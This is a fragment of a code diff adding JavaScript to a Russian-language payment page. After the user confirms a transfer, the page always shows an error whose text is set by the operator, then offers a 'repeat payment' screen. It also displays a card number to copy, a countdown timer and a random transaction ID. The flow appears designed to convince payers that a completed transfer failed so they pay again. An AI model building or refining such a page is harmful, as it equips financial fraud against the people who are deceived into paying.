+            confirmBtn.addEventListener('click', (e) => {
+                e.preventDefault();
+                validateAndProceed();
+            });
+
+            // Кнопка "Я оплатил" — показывает кастомную ошибку
+            payConfirmedBtn.addEventListener('click', () => {
+                stopTimer();
+                errorModalTitle.textContent = errorTitleInput.value.trim() || 'Ошибка';
+                errorModalMessage.textContent = errorMessageInput.value.trim() || 'Произошла ошибка';
+                showCustomModal();
+            });
+
+            // Кнопка в модалке ошибки — показывает экран повторного платежа
+            errorModalBtn.addEventListener('click', () => {
+                hideCustomModal();
+                showRepeatScreen();
+            });
+
+            // Кнопка "Оплатить" на экране повтора
+            repeatPayBtn.addEventListener('click', () => {
+                showSuccessModal();
+            });
+
+            // Кнопка "Закрыть" в модалке успеха
+            successModalBtn.addEventListener('click', () => {
+                hideSuccessModal();
+                showInputScreen();
+            });
+
+            // Кнопка "Отмена" на экране повтора
+            repeatCancelBtn.addEventListener('click', () => {
+                showInputScreen();
+            });
+
+            cancelPaymentBtn.addEventListener('click', () => {
+                if (confirm('Отменить платёж?')) {
+                    stopTimer();
+                    alert('Платёж отменён.');
+                    showInputScreen();
+                }
+            });
+
+            homeButton.addEventListener('click', () => {
+                if (paymentScreen.style.display === 'block' || repeatScreen.style.display === 'block') {
+                    if (confirm('Вернуться к вводу данных? Платёж будет прерван.')) {
+                        stopTimer();
+                        showInputScreen();
+                    }
+                } else {
+                    showInputScreen();
+                }
+            });
+
+            copyCardBtn.addEventListener('click', () => {
+                const cardNumber = displayCard.textContent;
+                navigator.clipboard.writeText(cardNumber).then(() => {
+                    alert('Номер карты скопирован: ' + cardNumber);
+                }).catch(() => {
+                    alert('Не удалось скопировать, выделите вручную.');
+                });
+            });
+
+            closeTimeoutBtn.addEventListener('click', () => {
+                hideTimeoutModal();
+                showInputScreen();
+            });
+
+            toggleSettings.addEventListener('click', () => {
+                settingsPanel.classList.toggle('show');
+                toggleSettings.classList.toggle('open');
+            });
+
+            cardNumberInput.addEventListener('input', function(e) {
+                let val = e.target.value.replace(/\D/g, '');
+                let formatted = '';
+                for (let i = 0; i < val.length; i++) {
+                    if (i > 0 && i % 4 === 0) formatted += ' ';
+                    formatted += val[i];
+                }
+                e.target.value = formatted;
+            });
+
+            timerMinutesInput.addEventListener('input', function() {
+                let val = parseInt(this.value);
+                if (val < 1) this.value = 1;
+                if (val > 60) this.value = 60;
+            });
+
+            document.addEventListener('keypress', (e) => {
+                if (e.key === 'Enter' && e.target.tagName !== 'TEXTAREA') {
+                    e.preventDefault();
+                    if (inputScreen.style.display !== 'none') {
+                        validateAndProceed();
+                    }
+                }
+            });
+
+            // Стартовое состояние
+            inputScreen.style.display = 'block';
+            paymentScreen.style.display = 'none';
+            repeatScreen.style.display = 'none';
+            hideTimeoutModal();
+            hideCustomModal();
+            hideSuccessModal();
+            transactionSpan.textContent = generateRandomId();
+            
+            // Если есть payment_id, показываем уведомление
+            if (paymentId) {
+                console.log('Payment ID from URL:', paymentId);
+            }
+        })();
+    </script>
+</body>
+</html>
